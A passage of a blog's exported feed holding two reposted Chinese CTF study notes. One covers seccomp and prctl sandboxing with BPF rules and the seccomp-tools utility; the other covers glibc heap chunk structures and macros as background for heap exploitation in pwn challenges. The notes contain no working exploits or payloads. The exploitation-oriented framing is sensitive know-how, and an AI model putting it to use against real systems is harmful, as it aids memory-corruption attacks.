]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>初探沙箱———转载</title>
    <url>/2021/04/29/2021-04-29-%E5%88%9D%E6%8E%A2%E6%B2%99%E7%AE%B1%E2%80%94%E2%80%94%E2%80%94%E8%BD%AC%E8%BD%BD/</url>
    <content><![CDATA[<p><strong>z转载自<a href="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/">Tiegu’s Blog</a></strong></p>
<h1 id="沙箱机制初探"><a href="#沙箱机制初探" class="headerlink" title="沙箱机制初探"></a>沙箱机制初探</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前做题遇到过几次关于沙箱的题目，自己都是靠猜或者是去网上找一些零碎的知识去做的，现在刷buu发现一道关于沙箱机制的题目，加之最近觉得没写博客感觉很多知识点忘得很快，所以打算学习一下沙箱机制，顺便写一篇博客去记录一下。</p>
<h2 id="what’s-the-沙箱安全机制"><a href="#what’s-the-沙箱安全机制" class="headerlink" title="what’s the 沙箱安全机制"></a>what’s the 沙箱安全机制</h2><p>在计算机安全领域，沙箱(Sandbox)是一种程序的隔离运行机制，其目的是限制不可信进程或不可信代码运行时的访问权限。沙箱技术经常被用于执行未经测试的或不可信的客户程序。为了阻止不可信程序可能破坏系统程序或破坏其它用户程序的运行，沙箱技术通过为不可信客户程序提供虚拟化的内存、文件系统、网络等资源，而这种虚拟化手段对客户程序来说是透明的。由于沙箱里的资源被虚拟化（或被间接化），所以沙箱里的不可信程序的恶意行为可以被限制在沙箱中，或者在沙箱里只允许执行在白名单里规定的有限的API操作。</p>
<p><strong>看概念感觉沙箱机制是一种安全隔离技术，但是个人感觉目前做pwn题遇到的沙箱机制用到的是对于一些system call的调用的ban，所以以下介绍的不是对这个沙箱机制的深入了解，而是介绍两种常见的沙箱 seccomp 安全机制和 prctl 。</strong></p>
<h2 id="seccomp的探索"><a href="#seccomp的探索" class="headerlink" title="seccomp的探索"></a><code>seccomp</code>的探索</h2><h3 id="What-is-seccomp"><a href="#What-is-seccomp" class="headerlink" title="What is seccomp"></a>What is seccomp</h3><p>seccomp (short for secure computing mode) is a computer security facility in the Linux kernel. It was merged into the Linux kernel mainline in kernel version 2.6.12, which was released on March 8, 2005. seccomp allows a process to make a one-way transition into a “secure” state where it cannot make any system calls except exit(), sigreturn(), read() and write() to already-open file descriptors. Should it attempt any other system calls, the kernel will terminate the process with SIGKILL or SIGSYS. In this sense, it does not virtualize the system’s resources but isolates the process from them entirely.</p>
<h3 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h3><p>这里主要介绍几个函数以及利用。</p>
<p><strong><a href="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/1.png"><img  src="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/1.png"  ><span class="image-caption">img</span></a></strong></p>
<p><code>ctx</code>是<code>Filter context/handle</code>,其中<code>typedef void *scmp_filter_ctx;</code><br><code>seccomp_init</code>是初始化的过滤状态,这里用的是<code>SCMP_ACT_ALLOW</code>,表示默认允许所有的syscacll.如果初始化状态为<code>SCMP_ACT_KILL</code>,则表示默认不允许所有的syscall （详见下图）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/*<br> * seccomp actions<br> */<br><br>/**<br> * Kill the process<br> */<br>#define SCMP_ACT_KILL		0x00000000U<br>/**<br> * Throw a SIGSYS signal<br> */<br>#define SCMP_ACT_TRAP		0x00030000U<br>/**<br> * Return the specified error code<br> */<br>#define SCMP_ACT_ERRNO(x)	(0x00050000U | ((x) &amp; 0x0000ffffU))<br>/**<br> * Notify a tracing process with the specified value<br> */<br>#define SCMP_ACT_TRACE(x)	(0x7ff00000U | ((x) &amp; 0x0000ffffU))<br>/**<br> * Allow the syscall to be executed after the action has been logged<br> */<br>#define SCMP_ACT_LOG		0x7ffc0000U<br>/**<br> * Allow the syscall to be executed<br> */<br>#define SCMP_ACT_ALLOW		0x7fff0000U<br></code></pre></td></tr></table></figure>

<p><code>seccomp_rule_add</code>是添加一条规则,函数原形如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">int seccomp_rule_add(scmp_filter_ctx ctx, uint32_t action, int syscall, unsigned int arg_cnt, ...);<br></code></pre></td></tr></table></figure>

<p><code>seccomp_load</code>是应用过滤,如果不调用<code>seccomp_load</code>则上面所有的过滤都不会生效</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">int seccomp_load(const scmp_filter_ctx ctx);<br></code></pre></td></tr></table></figure>

<p>有一点需要再说一下,我们用的是<code>seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);</code>,<code>arg_cnt</code>为0,表示我们直接限制execve,不管他什么参数.</p>
<p>如果<code>arg_cnt</code>不为0,那<code>arg_cnt</code>表示后面限制的参数的个数,也就是只有调用execve,且参数满足要求时,才会拦截syscall.（参数详情参见下图）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/**<br> * Specify an argument comparison struct for use in declaring rules<br> * @param arg the argument number, starting at 0<br> * @param op the comparison operator, e.g. SCMP_CMP_*<br> * @param datum_a dependent on comparison<br> * @param datum_b dependent on comparison, optional<br> */<br>#define SCMP_CMP(...)		((struct scmp_arg_cmp)&#123;__VA_ARGS__&#125;)<br><br>/**<br> * Specify an argument comparison struct for argument 0<br> */<br>#define SCMP_A0(...)		SCMP_CMP(0, __VA_ARGS__)<br><br>/**<br> * Specify an argument comparison struct for argument 1<br> */<br>#define SCMP_A1(...)		SCMP_CMP(1, __VA_ARGS__)<br><br>/**<br> * Specify an argument comparison struct for argument 2<br> */<br>#define SCMP_A2(...)		SCMP_CMP(2, __VA_ARGS__)<br><br>/**<br> * Specify an argument comparison struct for argument 3<br> */<br>#define SCMP_A3(...)		SCMP_CMP(3, __VA_ARGS__)<br><br>/**<br> * Specify an argument comparison struct for argument 4<br> */<br>#define SCMP_A4(...)		SCMP_CMP(4, __VA_ARGS__)<br><br>/**<br> * Specify an argument comparison struct for argument 5<br> */<br>#define SCMP_A5(...)		SCMP_CMP(5, __VA_ARGS__)<br><br><br><br>/**<br> * Comparison operators<br> */<br>enum scmp_compare &#123;<br>	_SCMP_CMP_MIN = 0,<br>	SCMP_CMP_NE = 1,		/**&lt; not equal */<br>	SCMP_CMP_LT = 2,		/**&lt; less than */<br>	SCMP_CMP_LE = 3,		/**&lt; less than or equal */<br>	SCMP_CMP_EQ = 4,		/**&lt; equal */<br>	SCMP_CMP_GE = 5,		/**&lt; greater than or equal */<br>	SCMP_CMP_GT = 6,		/**&lt; greater than */<br>	SCMP_CMP_MASKED_EQ = 7,		/**&lt; masked equality */<br>	_SCMP_CMP_MAX,<br>&#125;;<br><br>/**<br> * Argument datum<br> */<br>typedef uint64_t scmp_datum_t;<br><br>/**<br> * Argument / Value comparison definition<br> */<br>struct scmp_arg_cmp &#123;<br>	unsigned int arg;	/**&lt; argument number, starting at 0 */<br>	enum scmp_compare op;	/**&lt; the comparison op, e.g. SCMP_CMP_* */<br>	scmp_datum_t datum_a;<br>	scmp_datum_t datum_b;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>举个例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#include &lt;unistd.h&gt;<br>#include &lt;seccomp.h&gt;<br>#include &lt;linux/seccomp.h&gt;<br><br>int main(void)&#123;<br>	scmp_filter_ctx ctx;<br>	ctx = seccomp_init(SCMP_ACT_ALLOW);<br>	seccomp_rule_add(ctx, SCMP_ACT_KILL,         SCMP_SYS(write),1,SCMP_A2(SCMP_CMP_EQ,0x10));//第2(从0)个参数等于0x10<br>	seccomp_load(ctx);<br>	write(1,&quot;i will give you a shell\n&quot;,24);//不被拦截<br>	write(1,&quot;1234567812345678&quot;,0x10);//被拦截<br>	return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="prctl-函数"><a href="#prctl-函数" class="headerlink" title="prctl 函数"></a>prctl 函数</h2><p>查看函数原型：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#include &lt;sys/prctl.h&gt;<br>int prctl(int option, unsigned long arg2, unsigned long arg3,unsigned long arg4,unsigned long arg5);<br></code></pre></td></tr></table></figure>

<p>第一个参数是指定相应的操作，在手册上有特别多的选项，这里打算介绍两个。</p>
<h3 id="PR-SET-NO-NEW-PRIVS-用38表示"><a href="#PR-SET-NO-NEW-PRIVS-用38表示" class="headerlink" title="PR_SET_NO_NEW_PRIVS(用38表示)"></a>PR_SET_NO_NEW_PRIVS(用38表示)</h3><p>简单的说就是如果 option 设置为 <code>PR_SET_NO_NEW_PRIVS</code> 的话，第二个参数如果设置为 1 的话，<strong>不能够进行 execve 的系统调用，同时这个选项还会继承给子进程</strong>。</p>
<p>这样的话常规的调用 system 函数、one_gadget 的用不了了，这里的设置点其实和 <strong>pwnable.tw 上 orw 那道题一样，只能进行几个系统调用：open、write、read</strong>。</p>
<p><strong><a href="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/2.png"><img  src="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/2.png"  ><span class="image-caption">img</span></a></strong></p>
<p>从上图可以看出，当prctl的第一个参数设置为38时，第二个参数设置为1时，变会触发上述效果。</p>
<h3 id="PR-SET-SECCOMP（用22表示）"><a href="#PR-SET-SECCOMP（用22表示）" class="headerlink" title="PR_SET_SECCOMP（用22表示）"></a>PR_SET_SECCOMP（用22表示）</h3><p>第二个参数，可以参见man手册里面的介绍</p>
<p><strong><a href="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/3.png"><img  src="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/3.png"  ><span class="image-caption">img</span></a></strong></p>
<p>设置 seccomp ，其实也就是设置沙箱规则，这个 option 有两个子参数：</p>
<ul>
<li><p>这里如果设置了 <code>SECCOMP_MODE_STRICT</code> （用1表示）模式的话，系统调用只能使用 read, write,_exit 这三个。</p>
</li>
<li><p>如果设置了 <code>SECCOMP_MODE_FILTER</code> （用2表示）的话，系统调用规则就可以被 Berkeley Packet Filter（BPF） 的规则所定义，这玩意就是这里最最重点的东西了。</p>
<p>首先介绍一下这个BPF是啥吧，度娘上面的解释是：</p>
<p><strong><a href="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/4.png"><img  src="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/4.png"  ><span class="image-caption">img</span></a></strong></p>
</li>
</ul>
<p>看解释感觉是网络数据包传输过滤的一种规则，但事实上，后面已经被引用为沙箱规则</p>
<blockquote>
<p>BPF 定义了一个伪机器。这个伪机器可以执行代码，有一个累加器，寄存器，和赋值、算术、跳转指令。一条指令由一个定义好的结构 struct bpf_insn 表示，与真正的机器代码很相似，若干个这样的结构组成的数组，就成为 BPF 的指令序列。</p>
</blockquote>
<p>总结一些点：</p>
<ol>
<li><p><strong>结构赋值操作指令为</strong>：BPF_STMT、BPF_JUMP ，两个宏展开都是已经赋值的了struct bpf_insn结构。</p>
</li>
<li><p><strong>BPF 的主要指令有</strong> BPF_LD，BPF_ALU，BPF_JMP，BPF_RET 等。BPF_LD 将数据装入累加器，BPF_ALU 对累加器执行算术命令，BPF_JMP 是跳转指令，BPF_RET 是程序返回指令</p>
</li>
<li><p><strong>BPF 条件判断跳转指令</strong>：BPF_JMP、BPF_JEQ，BPF_JA,BPF_JGT等，语法跟汇编语言几乎相等，根据后面的几个参数进行判断，然后跳转到相应的地方。</p>
</li>
<li><p><strong>返回指令</strong>：BPF_RET、BPF_K，返回后面参数的值</p>
</li>
<li><p><strong>一些杂用指令</strong>：BPF_H表示按字传输，BPF_W表示按双字传输，BPF_B表示按单个字节传输；BPF_ABS表示绝对偏移，BPF_IND表示相对偏移， <code>SECCOMP_RET_ALLOW</code> 表示允许， <code>SECCOMP_RET_ERRNO</code> 表示禁止。</p>
<p>这个其实背后也牵涉到很多内容，参见以下两篇文章的介绍。</p>
<p><a href="http://www.360doc.com/content/06/1026/17/13362_241408.shtml">http://www.360doc.com/content/06/1026/17/13362_241408.shtml</a></p>
</li>
</ol>
<p><a href="http://www.secwk.com/2019/09/20/6564/">http://www.secwk.com/2019/09/20/6564/</a></p>
<h2 id="seccomp-tools-工具"><a href="#seccomp-tools-工具" class="headerlink" title="seccomp-tools 工具"></a>seccomp-tools 工具</h2><p>以上设置在pwn题中遇到时一般都是禁止了一些系统调用。故可以<strong>seccomp-tools</strong>这个工具去查看禁用的系统调用。</p>
<ul>
<li><p>安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo apt install gcc ruby-dev</span><br><span class="hljs-meta">$</span><span class="bash"> gem install seccomp-tools</span><br></code></pre></td></tr></table></figure></li>
<li><p>使用：一般用到dump这个用法，其他详细用法可见上面github。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">seccomp-tools dump ./pwn<br></code></pre></td></tr></table></figure></li>
</ul>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://www.secwk.com/2019/09/20/6564/">http://www.secwk.com/2019/09/20/6564/</a></p>
<p><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
]]></content>
      <tags>
        <tag>sandbox</tag>
      </tags>
  </entry>
  <entry>
    <title>heap structure</title>
    <url>/2021/04/20/2021-04-20-heap-structure/</url>
    <content><![CDATA[<p>s转载自CTF-WIKI<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/heap_structure-zh/">https://wiki.x10sec.org/pwn/linux/glibc-heap/heap_structure-zh/</a></p>
<h1 id="堆相关数据结构"><a href="#堆相关数据结构" class="headerlink" title="堆相关数据结构"></a>堆相关数据结构</h1><p>堆的操作就这么复杂，那么在 glibc 内部必然也有精心设计的数据结构来管理它。与堆相应的数据结构主要分为</p>
<ul>
<li>宏观结构，包含堆的宏观信息，可以通过这些数据结构索引堆的基本信息。</li>
<li>微观结构，用于具体处理堆的分配与回收中的内存块。</li>
</ul>
<h2 id="微观结构"><a href="#微观结构" class="headerlink" title="微观结构"></a>微观结构</h2><p>这里首先介绍堆中比较细节的结构，<strong>堆的漏洞利用与这些结构密切相关</strong>。</p>
<h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中。</p>
<p>非常有意思的是，<strong>无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构</strong>。虽然它们使用了同一个数据结构，但是根据是否被释放，它们的表现形式会有所不同。</p>
<p>malloc_chunk 的结构如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  This struct declaration is misleading (but accurate and necessary).</span><br><span class="hljs-comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span><br><span class="hljs-comment">  fields at known offsets from a given base. See explanation below.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>首先，这里给出一些必要的解释 INTERNAL_SIZE_T，SIZE_SZ，MALLOC_ALIGN_MASK：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* INTERNAL_SIZE_T is the word-size used for internal bookkeeping of</span><br><span class="hljs-comment">   chunk sizes.</span><br><span class="hljs-comment">   The default version is the same as size_t.</span><br><span class="hljs-comment">   While not strictly necessary, it is best to define this as an</span><br><span class="hljs-comment">   unsigned type, even if size_t is a signed type. This may avoid some</span><br><span class="hljs-comment">   artificial size limitations on some systems.</span><br><span class="hljs-comment">   On a 64-bit machine, you may be able to reduce malloc overhead by</span><br><span class="hljs-comment">   defining INTERNAL_SIZE_T to be a 32 bit `unsigned int&#x27; at the</span><br><span class="hljs-comment">   expense of not being able to handle more than 2^32 of malloced</span><br><span class="hljs-comment">   space. If this limitation is acceptable, you are encouraged to set</span><br><span class="hljs-comment">   this unless you are on a platform requiring 16byte alignments. In</span><br><span class="hljs-comment">   this case the alignment requirements turn out to negate any</span><br><span class="hljs-comment">   potential advantages of decreasing size_t word size.</span><br><span class="hljs-comment">   Implementors: Beware of the possible combinations of:</span><br><span class="hljs-comment">     - INTERNAL_SIZE_T might be signed or unsigned, might be 32 or 64 bits,</span><br><span class="hljs-comment">       and might be the same width as int or as long</span><br><span class="hljs-comment">     - size_t might have different width and signedness as INTERNAL_SIZE_T</span><br><span class="hljs-comment">     - int and long might be 32 or 64 bits, and might be the same width</span><br><span class="hljs-comment">   To deal with this, most comparisons and difference computations</span><br><span class="hljs-comment">   among INTERNAL_SIZE_Ts should cast them to unsigned long, being</span><br><span class="hljs-comment">   aware of the fact that casting an unsigned int to a wider long does</span><br><span class="hljs-comment">   not sign-extend. (This also makes checking for negative numbers</span><br><span class="hljs-comment">   awkward.) Some of these casts result in harmless compiler warnings</span><br><span class="hljs-comment">   on some systems.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> INTERNAL_SIZE_T</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> INTERNAL_SIZE_T size_t</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-comment">/* The corresponding word size.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SIZE_SZ (sizeof (INTERNAL_SIZE_T))</span><br><br><span class="hljs-comment">/* The corresponding bit mask value.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span><br></code></pre></td></tr></table></figure>

<p>一般来说，size_t 在 64 位中是 64 位无符号整数，32 位中是 32 位无符号整数。</p>
<p>每个字段的具体的解释如下</p>
<ul>
<li>  <strong>prev_size</strong>,  如果该 chunk 的<strong>物理相邻的前一地址chunk（两个指针的地址差值为前一chunk大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小(包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个chunk 的数据。**这里的前一 chunk 指的是较低地址的 chunk **。</li>
<li><strong>size</strong> ，该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示<ul>
<li>  NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1表示不属于，0表示属于。</li>
<li>  IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。 </li>
<li>  PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的P位都会被设置为1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲chunk之间的合并。</li>
</ul>
</li>
<li><strong>fd，bk</strong>。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下<ul>
<li>  fd 指向下一个（非物理相邻）空闲的 chunk</li>
<li>  bk 指向上一个（非物理相邻）空闲的 chunk</li>
<li>  通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li>
</ul>
</li>
<li><strong>fd_nextsize， bk_nextsize</strong>，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<ul>
<li>  fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>  bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>  一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适chunk 时挨个遍历。</strong></li>
</ul>
</li>
</ul>
<p>一个已经分配的 chunk 的样子如下。<strong>我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。</strong> </p>
<p>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前chunk使用。<strong>这就是chunk中的空间复用。</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>        |             Size of previous chunk, <span class="hljs-function"><span class="hljs-keyword">if</span> <span class="hljs-title">unallocated</span> <span class="hljs-params">(P clear)</span>  |</span><br><span class="hljs-function">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-function">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="hljs-function">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-function">        |             User data starts here...                          .</span><br><span class="hljs-function">        .                                                               .</span><br><span class="hljs-function">        .             <span class="hljs-params">(malloc_usable_size() bytes)</span>                      .</span><br><span class="hljs-function">next    .                                                               |</span><br><span class="hljs-function">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-function">        |             <span class="hljs-params">(size of chunk, but used <span class="hljs-keyword">for</span> application data)</span>    |</span><br><span class="hljs-function">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-function">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="hljs-function">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></code></pre></td></tr></table></figure>

<p>被释放的 chunk 被记录在链表中（可能是循环双向链表，也可能是单向链表）。具体结构如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>        |             Size of previous chunk, <span class="hljs-function"><span class="hljs-keyword">if</span> <span class="hljs-title">unallocated</span> <span class="hljs-params">(P clear)</span>  |</span><br><span class="hljs-function">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-function">`head:<span class="hljs-string">&#x27; |             Size of chunk, in bytes                     |A|0|P|</span></span><br><span class="hljs-string"><span class="hljs-function">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="hljs-string"><span class="hljs-function">        |             Forward pointer to next chunk in list             |</span></span><br><span class="hljs-string"><span class="hljs-function">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="hljs-string"><span class="hljs-function">        |             Back pointer to previous chunk in list            |</span></span><br><span class="hljs-string"><span class="hljs-function">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="hljs-string"><span class="hljs-function">        |             Unused space (may be 0 bytes long)                .</span></span><br><span class="hljs-string"><span class="hljs-function">        .                                                               .</span></span><br><span class="hljs-string"><span class="hljs-function"> next   .                                                               |</span></span><br><span class="hljs-string"><span class="hljs-function">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="hljs-string"><span class="hljs-function">`foot:&#x27;</span> |             Size of chunk, in bytes                           |</span><br><span class="hljs-function">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-function">        |             Size of next chunk, in bytes                |A|<span class="hljs-number">0</span>|<span class="hljs-number">0</span>|</span><br><span class="hljs-function">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></code></pre></td></tr></table></figure>

<p>可以发现，如果一个 chunk 处于 free 状态，那么会有两个位置记录其相应的大小</p>
<ol>
<li><p>本身的 size 字段会记录，</p>
</li>
<li><p>它后面的 chunk 会记录。</p>
</li>
</ol>
<p><strong>一般情况下</strong>，物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。</p>
<p><strong>！！！一些关于堆的约束，后面详细考虑！！！</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    The three exceptions to all this are:</span><br><span class="hljs-comment">     1. The special chunk `top&#x27; doesn&#x27;t bother using the</span><br><span class="hljs-comment">    trailing size field since there is no next contiguous chunk</span><br><span class="hljs-comment">    that would have to index off it. After initialization, `top&#x27;</span><br><span class="hljs-comment">    is forced to always exist.  If it would become less than</span><br><span class="hljs-comment">    MINSIZE bytes long, it is replenished.</span><br><span class="hljs-comment">     2. Chunks allocated via mmap, which have the second-lowest-order</span><br><span class="hljs-comment">    bit M (IS_MMAPPED) set in their size fields.  Because they are</span><br><span class="hljs-comment">    allocated one-by-one, each must contain its own trailing size</span><br><span class="hljs-comment">    field.  If the M bit is set, the other bits are ignored</span><br><span class="hljs-comment">    (because mmapped chunks are neither in an arena, nor adjacent</span><br><span class="hljs-comment">    to a freed chunk).  The M bit is also used for chunks which</span><br><span class="hljs-comment">    originally came from a dumped heap via malloc_set_state in</span><br><span class="hljs-comment">    hooks.c.</span><br><span class="hljs-comment">     3. Chunks in fastbins are treated as allocated chunks from the</span><br><span class="hljs-comment">    point of view of the chunk allocator.  They are consolidated</span><br><span class="hljs-comment">    with their neighbors only in bulk, in malloc_consolidate.</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>

<h4 id="chunk相关宏"><a href="#chunk相关宏" class="headerlink" title="chunk相关宏"></a>chunk相关宏</h4><p>这里主要介绍 chunk 的大小、对齐检查以及一些转换的宏。</p>
<p><strong>chunk 与 mem 指针头部的转换</strong></p>
<p>mem指向用户得到的内存的起始位置。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* conversion from malloc headers to user pointers, and back */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ))</span><br></code></pre></td></tr></table></figure>

<p><strong>最小的 chunk 大小</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* The smallest possible chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))</span><br></code></pre></td></tr></table></figure>
